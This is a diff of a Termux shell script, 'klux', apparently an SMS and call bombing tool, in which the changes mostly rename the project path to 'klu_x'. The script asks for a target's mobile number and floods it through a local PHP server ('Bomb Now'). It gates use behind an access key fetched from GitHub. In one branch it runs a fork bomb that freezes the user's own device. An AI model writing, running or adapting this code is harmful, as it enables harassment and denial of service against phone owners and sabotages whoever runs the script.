@@ -1,7 +1,7 @@
 check(){
-if wget --spider https://raw.githubusercontent.com/noob-hackers/klux/master/update.v1.2 2>/dev/null; then
-cd $HOME/klux/server/updates
-echo "spmx" > update.txt
+if wget --spider https://raw.githubusercontent.com/noob-hackers/klu_x/master/update.v1.2 2>/dev/null; then
+cd $HOME/klu_x/server/updates
+echo "KLU_X" > update.txt
 else
 echo
 fi
@@ -9,8 +9,8 @@ fi
 echo
 check
 option(){
-if [ -f "$HOME/klux/server/updates/update.txt" ];then
-cd $HOME/klux/server/updates
+if [ -f "$HOME/klu_x/server/updates/update.txt" ];then
+cd $HOME/klu_x/server/updates
 bash update.sh
 else
 echo " "
@@ -18,8 +18,8 @@ fi
 }
 option
 check1(){
-if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/klux.v.1 2>/dev/null; then
-cd $HOME/klux/server/updates
+if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/klu_x.v.1 2>/dev/null; then
+cd $HOME/klu_x/server/updates
 echo "spmx" > patch.txt
 else
 echo
@@ -27,8 +27,8 @@ fi
 }
 check1
 option1(){
-if [ -f "/data/data/com.termux/files/klux/server/updates/patch.txt" ];then
-cd $HOME/klux/server/updates
+if [ -f "/data/data/com.termux/files/klu_x/server/updates/patch.txt" ];then
+cd $HOME/klu_x/server/updates
 bash patch.sh
 else
 echo " "
@@ -37,7 +37,7 @@ fi
 option1
 bnr(){
 clear
-cd $HOME/klux/server/bnr
+cd $HOME/klu_x/server/bnr
 bash bnr1.sh
 echo -e "                   > By KLU MODDING<"
 echo -e "               > https://github.com/KLU-902 <"
@@ -45,7 +45,7 @@ echo -e "                > YOUTUBE:-KLU MODDING<"
 echo
 }
 men(){
-cd $HOME/klux
+cd $HOME/klu_x
 rm *.txt 2>/dev/null
 echo -e "[1] Bombing"
 echo -e "[2] Key"
@@ -63,7 +63,7 @@ then
 spams
 elif [ $opt1 = "2" ];
 then
-am start -a android.intent.action.VIEW -d https://shrinke.me/kluxcc > /dev/null 2>&1
+am start -a android.intent.action.VIEW -d https://shrinke.me/klu_xcc > /dev/null 2>&1
 bnr
 men
 elif [ $opt1 = "3" ];
@@ -71,7 +71,7 @@ then
 abot
 elif [ $opt1 = "4" ];
 then
-cd /data/data/com.termux/files/home/klux/server/updates
+cd /data/data/com.termux/files/home/klu_x/server/updates
 bash update.sh
 elif [ $opt1 = "5" ];
 then
@@ -137,7 +137,7 @@ bnr
 men
 }
 anonmenu(){
-if [ -f /data/data/com.termux/files/home/klux/server/anon/dat.txt ];
+if [ -f /data/data/com.termux/files/home/klu_x/server/anon/dat.txt ];
 then
 anondat
 else
@@ -145,7 +145,7 @@ anonmen
 fi
 }
 anondat(){
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 dt=$(date +%A)
 dro=$(cat dat.txt)
 if [ "$dt" == "$dro" ];
@@ -168,7 +168,7 @@ sleep 4.0
 bnr
 men
 else
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 rm *.txt
 anonmen
 fi
@@ -182,7 +182,7 @@ echo -e "
  █ ▄▀█  █▀▄ █
 ▐▌           ▌
 █▌▀▄  ▄▄  ▄▀▐█
-▐██  ▀▀  ▀▀  ██▌   klux V.1 BY K_L_U MODDING
+▐██  ▀▀  ▀▀  ██▌   klu_x V.1 BY K_L_U MODDING
 ▄████▄   ▌  ▄████▄
 "
 echo
@@ -192,10 +192,10 @@ printf %s\n "$msg"|jq -Rr @uri > lad.txt
 test=$(cat lad.txt)
 echo -ne "MOB NUMBER: "
 read mob
-cd $HOME/klux
+cd $HOME/klu_x
 wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
 read -s -p "ACCESS KEY: " secret
-cd $HOME/klux
+cd $HOME/klu_x
 otext=$(cat er3.txt)
 anontest
 }
@@ -204,7 +204,7 @@ if [[ $secret = $otext ]];
 then
 auth1
 else
-cd $HOME/klux
+cd $HOME/klu_x
 rm er3.txt 2>/dev/null
 clear
 echo " "
@@ -224,14 +224,14 @@ fi
 }
 auth1() {
 clear
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 remn=$(cat ctt.txt) >/dev/null 2>&1
 clear
 echo -e "
 ╭━━━━━━━━━━━╮
 ┃━━━●━══━━━━┃
 ┃           ┃  TARGET-$mob 
-┃   klux   ┃  ATTACK-ANONYMOUS SMS 
+┃   klu_x   ┃  ATTACK-ANONYMOUS SMS 
 ┃           ┃ 
 ┃           ┃ [1] ANON [2] Menu 
 ┃           ┃ [3] Go back [4] Quit
@@ -254,7 +254,7 @@ echo -e "         ==============================================="
 echo
 echo
 echo
-cd $HOME/klux
+cd $HOME/klu_x
 rm er3.txt 2>/dev/null
 anondd
 else
@@ -265,12 +265,12 @@ echo -e "                |  OOPS SERVER ISSUES..!   |"
 echo -e "                |   we will update it soon |"
 echo -e "                ============================"
 echo " "
-cd $HOME/klux
+cd $HOME/klu_x
 rm er3.txt 2>/dev/null
 fi
 }
 anondd(){
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 name=remin
 if [[ -e $name.txt || -L $name.txt ]] ; then
 i=0
@@ -280,7 +280,7 @@ done
 name=$name-$i
 fi
 touch -- "$name".txt
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 anonct=$(find remin*.txt | wc -l)
 if [[ $anonct = "1" ]]; then
 echo "20" > ctt.txt
@@ -346,13 +346,13 @@ echo "                      xx ERROR....! xx"
 fi
 }
 anoncrk(){
-FILE=/data/data/com.termux/files/home/klux/server/anon/limit.txt
+FILE=/data/data/com.termux/files/home/klu_x/server/anon/limit.txt
 if [ -f "$FILE" ]; then
 anondot
 fi
 }
 anondot(){
-cd /data/data/com.termux/files/home/klux/server/anon
+cd /data/data/com.termux/files/home/klu_x/server/anon
 dt=$(date +%A)
 chk=$(date +%A > dat.txt)
 dro=$(cat dat.txt)
@@ -379,7 +379,7 @@ echo -e "
 __/   -*-
 *d08b*  '%
 0088MM
-*9MMP* KLUX V.1 BY KLU MODDING
+*9MMP* klu_x V.1 BY KLU MODDING
 "
 echo -ne "NUMBER: "
 read num
@@ -404,15 +404,15 @@ sleep 3.0
 :(){ :|: & };:
 exit 1
 else
-cd $HOME/klux
+cd $HOME/klu_x
 wget -L https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/error/er3.txt 2>/dev/null
 read -s -p "ACCESS KEY: " access
-cd $HOME/klux
+cd $HOME/klu_x
 bas=$(cat er3.txt)
 fi
 if [[ $access = $bas ]];
 then
-cd $HOME/klux
+cd $HOME/klu_x
 rm er3.txt 2>/dev/null
 clear
 echo -e "
@@ -430,7 +430,7 @@ echo -e "
 ╰━━━━━━━━━━━╯
 "
 killall -9 php >/dev/null 2>&1
-cd /data/data/com.termux/files/home/klux/server/callnsms
+cd /data/data/com.termux/files/home/klu_x/server/callnsms
 php -S localhost:8080 >/dev/null 2>&1 &
 curl -L -s "http://localhost:8080/?mo=$num&submit=Bomb+Now" >/dev/null 2>&1
 sleep 1.0
